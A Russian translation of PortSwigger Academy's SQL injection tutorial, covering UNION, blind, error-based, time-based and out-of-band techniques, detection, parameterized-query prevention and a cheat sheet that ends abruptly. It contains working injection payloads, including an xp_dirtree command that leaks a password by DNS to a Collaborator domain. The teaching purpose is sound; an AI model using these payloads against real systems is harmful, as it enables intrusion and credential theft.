## SQL Injections (source: Portswigger academy):
### Что такое SQL инъекции
SQL инъекции - это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных. Как правило, это позволяет злоумышленнику просматривать данные, которые они обычно не могут получить. Это может включать данные, принадлежащие другим пользователям, или любые другие данные, к которым может получить доступ само приложение. Во многих случаях злоумышленник может изменить или удалить эти данные, что приведет к постоянным изменениям содержимого или поведения приложения.
В некоторых ситуациях злоумышленник может усилить атаку с использованием SQL-инъекции, чтобы скомпрометировать базовый сервер или другую внутреннюю инфраструктуру, или выполнить атаку с отказом в обслуживании (dos).
![](https://portswigger.net/web-security/images/sql-injection.svg)
### Какое влияние может оказать успешная SQL-инъекция?
Успешная атака с использованием SQL-инъекции может привести к несанкционированному доступу к конфиденциальным данным, таким как пароли, данные кредитной карты или личная информация пользователя. Многие громкие утечки данных в последние годы стали результатом атак с использованием SQL-инъекций, что привело к ущербу репутации и штрафам регулирующих органов. В некоторых случаях злоумышленник может получить постоянный бэкдор в системы организации, что приведет к долгосрочной эксплуатации, которая может оставаться незамеченной в течение длительного периода.
### Примеры SQL-инъекций
Существует большое разнообразие уязвимостей, атак и методов внедрения SQL, которые возникают в различных ситуациях. Некоторые распространенные примеры SQL-инъекций включают:
* Извлечение скрытых данных, где вы можете изменить SQL-запрос, чтобы вернуть дополнительные результаты.
* Подрыв логики приложения, где вы можете изменить запрос, чтобы вмешаться в логику приложения.
* *UNION* атаки, в которых вы можете извлекать данные из разных таблиц базы данных.
* Изучение базы данных, из которой можно извлечь информацию о версии и структуре базы данных.
* Слепая инъекция SQL, при которой результаты управляемого вами запроса не возвращаются в ответах приложения.
### Извлечение скрытых данных
Рассмотрим приложение для покупок, которое отображает товары в разных категориях. Когда пользователь нажимает на категорию *Gifts*, его браузер запрашивает URL-адрес:
>https://insecure-website.com/products?category=Gifts 

Это заставляет приложение выполнять SQL-запрос для получения сведений о соответствующих продуктах из базы данных:
>SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Этот запрос запрашивает у базы данных следущие данные:
* все данные («*»)
* из таблицы *products*
* где категория продуктов *Gifts*
* и released is 1

Ограничение released = 1 используется для скрытия продуктов, которые не выпущены. Для неизданных продуктов, предполагается released = 0.

Приложение не реализует никаких средств защиты от атак с использованием SQL-инъекций, поэтому злоумышленник может создать атаку, подобную:
>https://insecure-website.com/products?category=Gifts'--

В результате будет следующий SQL запрос:
>SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

Ключевым моментом здесь является то, что последовательность двойных тире -- это индикатор комментариев в SQL и означает, что остальная часть запроса интерпретируется как комментарий. Это эффективно удаляет оставшуюся часть запроса, поэтому он больше не включает *AND released = 1*. Это означает, что отображаются все продукты, включая неизданные.

Идя дальше, злоумышленник может заставить приложение отображать все товары в любой категории, включая категории, о которых они не знают:
>https://insecure-website.com/products?category=Gifts'+OR+1=1--

В результате будет следующий SQL запрос:
>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

Измененный запрос вернет все товары, в которых либо категория является *Gifts*, либо 1 равно 1. Поскольку 1=1 всегда истинно, запрос вернет все элементы.
### Подрыв логики приложения
Рассмотрим приложение, которое позволяет пользователям входить в систему с именем пользователя и паролем. Если пользователь вводит имя пользователя *wiener* и пароль *bluecheese*, приложение проверяет учетные данные, выполняя следующий SQL-запрос:
>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

Если запрос возвращает сведения о пользователе, то вход в систему выполнен успешно. В противном случае он отклоняется.

Здесь злоумышленник может войти в систему как любой пользователь без пароля, просто используя последовательность комментариев SQL-чтобы удалить проверку пароля из выражения *WHERE* запроса. Например, отправив имя пользователя **administrator'--** и пустой пароль, вы получите следующий запрос:
>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Этот запрос возвращает пользователя с именем администратора и успешно регистрирует злоумышленника как этого пользователя
### Извлечение данных из других таблиц базы данных
В случаях, когда результаты SQL-запроса возвращаются в ответах приложения, злоумышленник может использовать уязвимость SQL-инъекций для извлечения данных из других таблиц базы данных. Это делается с помощью ключевого слова *UNION*, которое позволяет выполнить дополнительный запрос *SELECT* и добавить результаты к исходному запросу.

Например, если приложение выполняет следующий запрос, содержащий введимое пользователем "Gifts":
>SELECT name, description FROM products WHERE category = 'Gifts'

тогда атакующий может внедрить:
>' UNION SELECT username, password FROM users--

Это приведет к тому, что приложение вернет все имена пользователей и пароли вместе с названиями и описаниями продуктов.
#### SQL injection UNION attacks
Когда приложение уязвимо для SQL инъекций и результаты запроса возвращаются в ответах приложения, ключевое слово UNION может использоваться для извлечения данных из других таблиц базы данных. Это приводит к атаке SQL injection UNION attacks.

Ключевое слово UNION позволяет выполнить один или несколько дополнительных запросов SELECT и добавить результаты к исходному запросу. Например:
>SELECT a, b FROM table1 UNION SELECT c, d FROM table2

Этот SQL-запрос вернет один результирующий набор с двумя столбцами, содержащий значения из столбцов a и b в table1 и столбцов c и d в table2.

Чтобы *UNION* запрос работал, должны быть выполнены два ключевых требования:
* Каждый отдельный запрос должен возвращать одинаковое количество столбцов.
* Типы данных в каждом столбце должны быть совместимы между отдельными запросами.

Чтобы выполнить атаку объединения SQL-инъекций, вам необходимо убедиться, что ваша атака соответствует этим двум требованиям. Как правило, атака включает в себя выяснение:
* Сколько столбцов возвращается из исходного запроса?
* Какие столбцы в исходномм запросе, имеют подходящий тип данных для хранения результатов инъектированного запроса?

##### Определение количества столбцов с помощью SQL injection UNION attack
При выполнении атаки SQL injection UNION attack существует два эффективных метода определения количества столбцов, возвращаемых из исходного запроса.

Первый метод включает в себя введение ряда запросов *ORDER BY* и увеличение указанного индекса столбца до тех пор, пока не произойдет ошибка. Например, предполагая, что точка ввода является строкой в кавычках в выражении WHERE исходного запроса, вы бы отправили:
>' ORDER BY 1--

>' ORDER BY 2--

>' ORDER BY 3-

>etc.

Эта серия полезных нагрузок изменяет исходный запрос, чтобы упорядочить результаты по разным столбцам в наборе результатов. Столбец в запросе *ORDER BY* может быть указан по его индексу, поэтому вам не нужно знать имена каких-либо столбцов. Когда указанный индекс столбца превышает количество фактических столбцов в результирующем запросе, база данных возвращает ошибку, такую как:
>The ORDER BY position number 3 is out of range of the number of items in the select list.

Приложение может фактически вернуть ошибку базы данных в своем HTTP-ответе, или оно может вернуть общую ошибку, или просто не вернуть результатов. При условии, что вы можете обнаружить некоторую разницу в ответе приложения, вы можете определить, сколько столбцов возвращается из запроса.

Второй метод включает отправку серии полезных нагрузок *UNION SELECT* с указанием другого количества *NULL* значений:
>' UNION SELECT NULL--

>' UNION SELECT NULL,NULL--

>' UNION SELECT NULL,NULL,NULL--

>etc.

Если количество *NULL* не совпадает с количеством столбцов, база данных возвращает ошибку, например:
>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

Опять же, приложение может фактически вернуть это сообщение об ошибке или просто вернуть общую ошибку или ничего не вернуть. Когда количество *NULL* совпадает с количеством столбцов, база данных возвращает дополнительную строку в результирующем наборе, содержащую нулевые значения в каждом столбце. Влияние на результирующий HTTP-ответ зависит от кода приложения. Если вам повезет, вы увидите в ответе некоторое дополнительное содержимое, например дополнительную строку в таблице HTML. В противном случае значения *NULL* могут вызвать другую ошибку, такую как исключение *NullPointerException*. В худшем случае ответ может быть неотличим от ответа, вызванного неправильным количеством *NULL*, что делает этот метод определения количества столбцов неэффективным.
>Заметка:

>* Причина использования *NULL* в качестве значений, возвращаемых из введенного запроса *SELECT*, заключается в том, что типы данных в каждом столбце должны быть совместимы между исходным и введенным запросами. Поскольку значение *NULL* преобразуется в каждый часто используемый тип данных, использование значения *NULL* увеличивает вероятность успешного выполнения полезной нагрузки при правильном подсчете столбцов.

>* В Oracle каждый запрос SELECT должен использовать ключевое слово *FROM* и указывать допустимую таблицу. В Oracle есть встроенная таблица под названием *dual*, которую можно использовать для этой цели. Таким образом, вводимые запросы в Oracle должны выглядеть следующим образом: 
<br/>' UNION SELECT NULL FROM DUAL--.

>* Описанные полезные нагрузки используют последовательность комментариев с двойным тире *--* для того, чтобы прокомментировать оставшуюся часть исходного запроса после точки ввода. В MySQL последовательность двойного тире должна сопровождаться пробелом. В качестве альтернативы для идентификации комментария можно использовать хэш-символ *#*.

##### Определение типа данных в столбце с помощью SQL injection UNION attack
Причина выполнения атаки SQL injection UNION attack заключается в том, чтобы иметь возможность извлекать результаты из введенного запроса. Как правило, интересные данные, которые вы хотите получить, будут в строковой форме, поэтому вам нужно найти один или несколько столбцов в исходных результатах запроса, тип данных которых соответствует строковым данным или совместим с ними.

Уже определив количество требуемых столбцов, вы можете проверить каждый столбец, чтобы проверить, может ли он содержать строковые данные, отправив серию полезных нагрузок *UNION SELECT*, которые по очереди помещают строковое значение в каждый столбец. Например, если запрос возвращает четыре столбца, вы должны отправить:
>' UNION SELECT 'a',NULL,NULL,NULL--

>' UNION SELECT NULL,'a',NULL,NULL--

>' UNION SELECT NULL,NULL,'a',NULL--

>' UNION SELECT NULL,NULL,NULL,'a'--

Если тип данных столбца несовместим со строковыми данными, введенный запрос вызовет ошибку базы данных, например:
>Conversion failed when converting the varchar value 'a' to data type int.

Если ошибка не возникает, и ответ приложения содержит некоторое дополнительное содержимое, включая введенное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.
##### Использование SQL injection UNION attack для получения "интересных" данных
Когда вы определили количество столбцов, возвращаемых исходным запросом, и выяснили, какие столбцы могут содержать строковые данные, вы сможете получить интересные данные.
Предположим что:
* Исходный запрос возвращает два столбца, оба из которых могут содержать строковые данные.
* Точка ввода - это строка в кавычках в выражении *WHERE*.
* База данных содержит таблицу под названием *users* со столбцами *username* и *password*.

В этом случае вы можете получить содержимое таблицы "*users*", отправив следующий запрос:
>' UNION SELECT username, password FROM users--

Конечно, важнейшая информация, необходимая для выполнения этой атаки, заключается в том, что существует таблица под названием *Users* с двумя столбцами, называемыми *username* и *password*. Без этой информации вам пришлось бы пытаться угадать названия таблиц и столбцов. Фактически, все современные базы данных предоставляют способы изучения её структуры, чтобы определить, какие таблицы и столбцы она содержит.
##### Получение множества значений в один столбец
В отличии от предыдущего примера предположим, что запрос возвращает только один столбец.

Вы можете легко получить несколько значений вместе в этом одном столбце, объединив значения вместе, в идеале включив подходящий разделитель, позволяющий различать объединенные значения. Например, в Oracle вы можете отправить запрос:
>' UNION SELECT username || '~' || password FROM users--

При этом используются символы двойного пайпа ||, которые являются оператором конкатенации строк в Oracle. Введенный запрос объединяет значения полей имени пользователя и пароля, разделенных символом ~.

Результаты запроса позволят вам прочитать все имена пользователей и пароли, например:
>...

>administrator~s3cure

>wiener~peter

>carlos~montoya

>...

Обратите внимание, что разные базы данных используют разный синтаксис для выполнения конкатенации строк.
### Изучение базы данных
После первоначального выявления уязвимости SQL-инъекциям, как правило, полезно получить некоторую информацию о самой базе данных. Эта информация часто может проложить путь для дальнейшей эксплуатации.

Вы можете запросить сведения о версии базы данных. Способ, которым это делается, зависит от типа базы данных, поэтому вы можете определить тип базы данных, исходя из того, какой метод работает. Например, в Oracle вы можете выполнить:
>SELECT * FROM v$version

Вы также можете определить, какие таблицы базы данных существуют и какие столбцы они содержат. Например, в большинстве баз данных вы можете выполнить следующий запрос, чтобы вывести список таблиц:
>SELECT * FROM information_schema.tables
#### Запрос типа и версии базы данных
Различные базы данных предоставляют различные способы запроса их версии. Вам часто приходится пробовать различные запросы, чтобы найти тот, который работает, позволяя вам определить как тип, так и версию программного обеспечения базы данных.

Запросы для определения версии базы данных для некоторых популярных типов баз данных следующие:
| Database type |	Query |
| Microsoft, MySQL |	SELECT @@version |
| Oracle |	SELECT * FROM v$version |
| PostgreSQL |	SELECT version() |
Например, вы можете использовать *UNION attack* со следующими входными данными:
>' UNION SELECT @@version--

Инъекция может получить вывод, подобный следующему, подтверждающий, что база данных является Microsoft SQL Server и используемой версией:
>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br/>
Mar 18 2018 09:11:49<br/>
Copyright (c) Microsoft Corporation<br/>
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br/>
  
#### Перечисление содержимого базы данных
Большинство типов баз данных (за заметным исключением Oracle) имеют набор представлений, называемых информационной схемой, которые предоставляют информацию о базе данных.

Вы можете запросить *information_schema.tables*, чтобы получить список таблиц в базе данных:
>SELECT * FROM information_schema.tables
  
Запрос вернёт следующее:
>TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE<br/>
=====================================================<br/>
MyDatabase dbo Products BASE TABLE<br/>
MyDatabase dbo Users BASE TABLE<br/>
MyDatabase dbo Feedback BASE TABLE<br/>

Этот вывод указывает, что существует три таблицы, называемые *Products*, *Users* и *Feedback*.

Затем вы можете запросить *information_schema.columns*, чтобы вывести список столбцов в отдельных таблицах:
>SELECT * FROM information_schema.columns WHERE table_name = 'Users'
  
Запрос вернёт следующее:
>TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE<br/>
=================================================================<br/>
MyDatabase dbo Users UserId int<br/>
MyDatabase dbo Users Username varchar<br/>
MyDatabase dbo Users Password varchar<br/>

Этот вывод показывает столбцы в указанной таблице и тип данных каждого столбца.
#### Эквивалент *information_schema* в Oracle
В Oracle вы можете получить ту же информацию с помощью немного других запросов.

Вы можете перечислить таблицы, запросив *all_tables*:
>SELECT * FROM all_tables

И вы можете перечислить столбцы, запросив *all_tab_columns*:
>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
### Уязвимости Blind SQL инъекции
Многие случаи SQL-инъекций являются слепыми уязвимостями. Это означает, что приложение не возвращает результаты SQL-запроса или сведения о каких-либо ошибках базы данных в своих ответах. Слепые уязвимости все еще могут быть использованы для доступа к несанкционированным данным, но используемые методы, как правило, более сложны и сложны в исполнении.

В зависимости от характера уязвимости и используемой базы данных для использования уязвимостей слепой инъекции SQL могут быть использованы следующие методы:
* Вы можете изменить логику запроса, чтобы вызвать обнаруживаемую разницу в ответе приложения в зависимости от истинности одного условия. Это может включать введение нового условия в некоторую Булеву логику или условное срабатывание ошибки, такой как деление на ноль.
* Вы можете условно вызвать временную задержку в обработке запроса, что позволит вам определить истинность условия на основе времени, которое требуется приложению для ответа.
* Вы можете запустить внеполосное(?) сетевое взаимодействие, используя методы OAST. Эта техника чрезвычайно мощна и работает в ситуациях, когда другие техники этого не делают. Часто вы можете напрямую извлекать данные по внешнему каналу, например, помещая данные в поиск DNS для домена, которым вы управляете.
#### Использование слепой SQL инъекции путем запуска условных ответов
Рассмотрим приложение, которое использует файлы cookie для сбора аналитических данных об использовании. Запросы к приложению включают заголовок файла cookie, подобный этому:
> Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

Когда обрабатывается запрос, содержащий файл cookie *TrackingID*, приложение определяет, является ли этот пользователь известным, используя такой SQL-запрос:
>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
  
Этот запрос уязвим для SQL инъекции, но результаты запроса не возвращаются пользователю. Однако приложение ведет себя по-разному в зависимости от того, возвращает ли запрос какие-либо данные. Если он возвращает данные (поскольку был отправлен распознанный идентификатор отслеживания), на странице отображается сообщение "Welcome back!".

Этого поведения достаточно, чтобы иметь возможность использовать уязвимость слепой SQL инъекции и извлекать информацию, вызывая различные ответы условно, в зависимости от введенного условия. Чтобы увидеть, как это работает, предположим, что по очереди отправляются два запроса, содержащих следующие значения файлов cookie *TrackingID*:
>…xyz' AND '1'='1<br/>
…xyz' AND '1'='2
  
Первое из этих значений приведет к тому, что запрос вернет результаты, потому что введенное условие *OR '1'='1* является истинным, и поэтому будет отображено сообщение "Welcome back!". В то время как второе значение приведет к тому, что запрос не вернет никаких результатов, поскольку введенное условие является ложным, и поэтому сообщение "Welcome back!" не будет отображаться. Это позволяет нам определить ответ на любое одно введенное условие и таким образом извлекать данные по одному биту за раз.

Например, предположим, что существует таблица под названием *Users* со столбцами *username* и *password* и пользователь с именем *Administrator*. Мы можем систематически выяснять пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.

Для этого мы начнем со следующих входных данных:
>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
  
Это возвращает сообщение "Welcome back!", указывающее, что введенное условие истинно, и поэтому первый символ пароля больше *m*.

Затем мы отправляем следующие входные данные:
>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
  
Это не возвращает сообщение "Welcome back!", указывающее, что введенное условие является ложным, и поэтому первый символ пароля не превышает *t*.

В конце концов, мы отправляем следующий ввод, который возвращает сообщение "Welcome back!", тем самым подтверждая, что первый символ пароля - *s*:
>xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
  
Мы можем продолжить этот процесс, чтобы систематически определять полный пароль для пользователя-*Administrator* символ за символом.
>Заметка<br/>
Функция *SUBSTRING* называется *SUBSTR* в некоторых типах баз данных. Для получения более подробной информации см. шпаргалку по SQL инъекциям.
#### Индуцирование условных ответов путем запуска ошибок SQL
В предыдущем примере предположим вместо этого, что приложение выполняет один и тот же SQL-запрос, но не ведет себя по-разному в зависимости от того, возвращает ли запрос какие-либо данные. Предыдущий метод не будет работать, потому что введение различных логических условий не влияет на ответы приложения.

В этой ситуации часто можно заставить приложение возвращать условные ответы, вызывая ошибки SQL условно, в зависимости от введенного условия. Это включает в себя изменение запроса таким образом, чтобы он вызывал ошибку базы данных, если условие истинно, но не в том случае если условие ложно. Очень часто необработанная ошибка, вызванная базой данных, вызывает некоторую разницу в ответе приложения (например, сообщение об ошибке), что позволяет нам сделать вывод об истинности введенного условия.

Чтобы увидеть, как это работает, предположим, что по очереди отправляются два запроса, содержащих следующие значения файлов cookie *TrackingID*:
>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a<br/>
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
  
Эти входные данные используют ключевое слово *CASE* для проверки условия и возвращают другое выражение в зависимости от того, является ли выражение истинным. При первом вводе выражение *CASE* принимает значение *"a"*, что не вызывает никаких ошибок. При втором вводе он оценивается в 1/0, что приводит к ошибке деления на ноль. Предполагая, что ошибка вызывает некоторую разницу в HTTP-ответе приложения, мы можем использовать эту разницу, чтобы определить, является ли введенное условие истинным.

Используя этот метод, мы можем извлекать данные уже описанным способом, систематически проверяя по одному символу за раз:
>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
  
>Заметка<br/>
Существуют различные способы запуска условных ошибок, и различные методы лучше всего работают с разными типами баз данных. Для получения более подробной информации см. шпаргалку по SQL инъекциям.
#### Использование слепой SQL инъекции путем запуска временных задержек
В предыдущем примере предположим, что приложение теперь улавливает ошибки базы данных и корректно их обрабатывает. Запуск ошибки базы данных при выполнении введенного SQL-запроса больше не вызывает никаких изменений в ответе приложения, поэтому предыдущий метод создания условных ошибок не будет работать.

В этой ситуации часто можно использовать уязвимость слепой SQL инъекции, вызывая временные задержки условно, в зависимости от введенного условия. Поскольку SQL - запросы обычно обрабатываются приложением синхронно, задержка выполнения SQL-запроса также приведет к задержке HTTP-ответа. Это позволяет нам сделать вывод об истинности введенного условия на основе времени, затраченного до получения HTTP - ответа.

Методы запуска временной задержки в значительной степени зависят от типа используемой базы данных. В Microsoft SQL Server ввод, подобный следующему, может использоваться для проверки условия и запуска задержки в зависимости от того, является ли выражение истинным:
>'; IF (1=2) WAITFOR DELAY '0:0:10'--<br/>
'; IF (1=1) WAITFOR DELAY '0:0:10'--
  
Первый из этих входов не вызовет задержки, потому что условие 1=2 является ложным. Второй ввод вызовет задержку в 10 секунд, потому что условие 1=1 верно.

Используя этот метод, мы можем извлекать данные уже описанным способом, систематически проверяя по одному символу за раз:
>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
>Заметка<br/>
Существуют различные способы инициирования временных задержек в SQL-запросах, и различные методы применяются к различным типам баз данных. Для получения более подробной информации см. шпаргалку по SQL инъекциям.
#### Использование слепой SQL инъекции с использованием внеполосных(?) методов (OAST)
Теперь предположим, что приложение выполняет один и тот же SQL-запрос, но делает это асинхронно. Приложение продолжает обрабатывать запрос пользователя в исходном потоке и использует другой поток для выполнения SQL-запроса с использованием файла cookie. Запрос по-прежнему уязвим для SQL инъекции, однако ни один из методов, описанных до сих пор, не будет работать: ответ приложения не зависит от того, возвращает ли запрос какие-либо данные, или от того, происходит ли ошибка базы данных, или от времени, затраченного на выполнение запроса.

В этой ситуации часто можно воспользоваться уязвимостью слепой SQL инъекции, запустив внеполосное сетевое взаимодействие с системой, которой вы управляете. Как и ранее, они могут запускаться условно, в зависимости от введенного условия, для вывода информации по одному биту за раз. Но что еще более важно, данные могут быть эксфильтрированы непосредственно в рамках самого сетевого взаимодействия.

Для этой цели можно использовать различные сетевые протоколы, но, как правило, наиболее эффективным является *DNS* (служба доменных имен). Это связано с тем, что очень многие информационные сети допускают свободный выход DNS-запросов, поскольку они необходимы для нормальной работы информационных систем.

Самый простой и надежный способ использовать внеполосные методы-это использовать *Burp Collaborator*. Это сервер, который предоставляет пользовательские реализации различных сетевых служб (включая DNS) и позволяет определять, когда сетевые взаимодействия происходят в результате отправки отдельных полезных нагрузок уязвимому приложению. Поддержка *Burp Collaborator* встроена в *Burp Suite Professional* без необходимости настройки.

Методы запуска DNS-запроса в значительной степени зависят от типа используемой базы данных. В Microsoft SQL Server ввод, подобный следующему, может использоваться для вызова поиска DNS в указанном домене:
>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
  
Это приведет к тому, что база данных выполнит поиск для следующего домена:
>0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
  
Вы можете использовать клиент *Collaborator Burp Suite* для создания уникального поддомена и опроса сервера *Collaborator*, чтобы подтвердить, когда происходят какие-либо запросы DNS.
  
Подтвердив способ запуска внеполосных взаимодействий, вы можете затем использовать внеполосный канал для извлечения данных из уязвимого приложения. Например:
>'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
  
Этот ввод считывает пароль пользователя-*administrator*, добавляет уникальный поддомен *Collaborator* и запускает поиск DNS. Это приведет к поиску DNS, как показано ниже, что позволит вам просмотреть сохраненный пароль:
>S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
  
Внеполосные методы (OAST) являются чрезвычайно мощным способом обнаружения и использования слепой SQL инъекции из-за высокой вероятности успеха и возможности прямой фильтрации данных по внеполосному каналу. По этой причине методы OAST часто предпочтительнее даже в ситуациях, когда другие методы слепой эксплуатации действительно работают.
>Заметка
Существуют различные способы запуска внеполосных взаимодействий, и различные методы применяются к различным типам баз данных. Для получения более подробной информации см. шпаргалку по SQL инъекциям.
#### Как предотвратить слепые SQL инъекции?
Хотя методы, необходимые для поиска и использования уязвимостей слепой SQL инъекции, отличаются и более сложны, чем для обычной SQL инъекции, меры, необходимые для предотвращения SQL инъекции, одинаковы независимо от того, является ли уязвимость слепой или нет.

Как и в случае обычной SQL-инъекции, слепые атаки можно предотвратить за счет тщательного использования параметризованных запросов, которые гарантируют, что вводимые пользователем данные не могут повлиять на структуру предполагаемого SQL-запроса.
### Как детектировать уязвимости SQL инъекциям
Большинство уязвимостей SQL-инъекций можно быстро и надежно обнаружить с помощью сканера веб-уязвимостей Burp Suite.

SQL инъекции можгут быть обнаружены вручную с помощью систематического набора тестов для каждой точки входа в приложение. Обычно это включает в себя:
* Отправка символа одинарной кавычки ' и поиск ошибок или других аномалий.
* Отправка некоторого специфичного для SQL синтаксиса, который вычисляет базовое (исходное) значение точки входа и другое значение, и поиск систематических различий в результирующих ответах приложения.
* Отправка логических условий, таких как *OR 1=1* и *OR 1=2*, и поиск различий в ответах приложения.
* Отправка полезных нагрузок, предназначенных для запуска временных задержек при выполнении SQL-запроса, и поиск различий во времени, затрачиваемом на ответ.
* Отправка полезных нагрузок OAST, предназначенных для запуска внеполосного(?) сетевого взаимодействия при выполнении в рамках SQL-запроса, и мониторинг любых результирующих взаимодействий.
### SQL инъекция в разные части запроса
Большинство уязвимостей при SQL инъекции возникают в выражении *WHERE* запроса *SELECT*. Этот тип SQL-инъекции, как правило, хорошо понятен опытным тестировщикам.

Но уязвимости SQL-инъекций в принципе могут возникать в любом месте запроса и в разных типах запросов. Наиболее распространенными другими местами, где возникает SQL-инъекция, являются:
* В операторах *UPDATE*, в пределах обновляемых значений или в выражении *WHERE*.
* В операторах *INSERT*, в пределах вставляемых значений.
* В операторах *SELECT*, в имени таблицы или столбца.
* В операторах *SELECT* в предложении *ORDER BY*.
### SQL инъекции второго порядка
SQL инъекции первого порядка возникает, когда приложение принимает вводимые пользователем данные из HTTP-запроса и в ходе обработки этого запроса включает вводимые данные в SQL-запрос небезопасным способом.

При SQL инъекции второго порядка (также известном как *stored* SQL инъекция) приложение принимает вводимые пользователем данные из HTTP-запроса и сохраняет их для дальнейшего использования. Обычно это делается путем помещения входных данных в базу данных, но в том месте, где хранятся данные, никакой уязвимости не возникает. Позже, при обработке другого HTTP-запроса, приложение извлекает сохраненные данные и включает их в SQL-запрос небезопасным способом.

SQL инъекции второго порядка часто возникает в ситуациях, когда разработчики знают об уязвимостях внедрения SQL и поэтому безопасно обрабатывают первоначальное размещение входных данных в базе данных. Когда данные позже обрабатываются, они считаются безопасными, поскольку ранее они были безопасно помещены в базу данных. На этом этапе данные обрабатываются небезопасным способом, потому что разработчик ошибочно считает их надежными.
![](https://portswigger.net/web-security/images/second-order-sql-injection.svg)
### Факторы, зависящие от базы данных
Некоторые основные функции языка SQL реализованы одинаковым образом на популярных платформах баз данных, и поэтому многие способы обнаружения и использования уязвимостей SQL-инъекций одинаково работают в разных типах баз данных.

Однако между общими базами данных также существует множество различий. Это означает, что некоторые методы обнаружения и использования SQL-инъекций работают по-разному на разных платформах. Например:
* Синтаксис для объединения строк.
* Комментарии.
* Пакетные (или стековые) запросы.
* API для конкретной платформы.
* Сообщения об ошибках.

### Как предотвратить SQL инъекции
Большинство случаев SQL инъекций можно предотвратить, используя параметризованные запросы (также известные как подготовленные инструкции) вместо объединения строк в запросе.

Следующий код уязвим для SQL инъекции, поскольку вводимые пользователем данные объединяются непосредственно в запрос:
```php
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Этот код можно легко переписать таким образом, чтобы пользовательский ввод не мешал структуре запроса:
```php
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

Параметризованные запросы можно использовать в любой ситуации, когда ненадежные входные данные отображаются в виде данных в запросе, включая выражения *WHERE* и значения в операторе *INSERT* или *UPDATE*. Их нельзя использовать для обработки ненадежных входных данных в других частях запроса, таких как имена таблиц или столбцов или выражении *ORDER BY*. Функции приложения, которые помещают ненадежные данные в эти части запроса, должны будут использовать другой подход, такой как включение разрешенных входных значений в белый список или использование другой логики для обеспечения требуемого поведения.

Чтобы параметризованный запрос эффективно предотвращал SQL инъекции, строка, используемая в запросе, всегда должна быть жестко запрограммированной константой и никогда не должна содержать никаких переменных данных из любого источника. Не поддавайтесь искушению решать в каждом конкретном случае, является ли элемент данных надежным, и продолжайте использовать объединение строк в запросе для случаев, которые считаются безопасными. Слишком легко ошибиться в отношении возможного происхождения данных или внести изменения в другой код, чтобы нарушить предположения о том, какие данные испорчены.

### Шпаргалка по SQL инъекциям
Эта шпаргалка по SQL-инъекциям содержит примеры полезного синтаксиса, который можно использовать для выполнения различных задач, часто возникающих при выполнении атак с использованием SQL-инъекций.
#### Объединение строк
Вы можете объединить несколько строк вместе, чтобы создать одну строку.
| db         | Выражение                                           |
| ---------- | --------------------------------------------------- |
| Oracle     |	'foo'||'bar'                                       |
| Microsoft  |	'foo'+'bar'                                        |
| PostgreSQL |	'foo'||'bar'                                       |
| MySQL      |	'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar') |
  
#### Подстроки
Вы можете извлечь часть строки из указанного смещения с указанной длиной. Обратите внимание, что индекс смещения начинается с 1. Каждое из следующих выражений вернет строку *ba*.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	SUBSTR('foobar', 4, 2) |
| Microsoft  |	SUBSTRING('foobar', 4, 2) |
| PostgreSQL |	SUBSTRING('foobar', 4, 2) |
| MySQL      |	SUBSTRING('foobar', 4, 2) |
#### Комментарии
Вы можете использовать комментарии для усечения запроса и удаления части исходного запроса, которая следует за вашими вводными данными.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	--comment |
| Microsoft  |	--comment<br/> /*comment*/ |
| PostgreSQL |	--comment<br/> /*comment*/ |
| MySQL      |	#comment<br/> -- comment [обратите внимание на пробел после дефисов]<br/> /*comment*/ |
#### Версия базы данных
Вы можете запросить базу данных, чтобы определить ее тип и версию. Эта информация полезна при разработке более сложных атак.
| db         | Выражение |
| ---------- | -----------------------|
| Oracle     |	SELECT banner FROM v$version<br/> SELECT version FROM v$instance |
| Microsoft  |	SELECT @@version |
| PostgreSQL |	SELECT version() |
| MySQL      |	SELECT @@version |
#### Информация о содержимом базы данных
Вы можете перечислить таблицы, существующие в базе данных, и столбцы, которые содержат эти таблицы.
| db         | Выражение |
| ---------- | -----------------------|
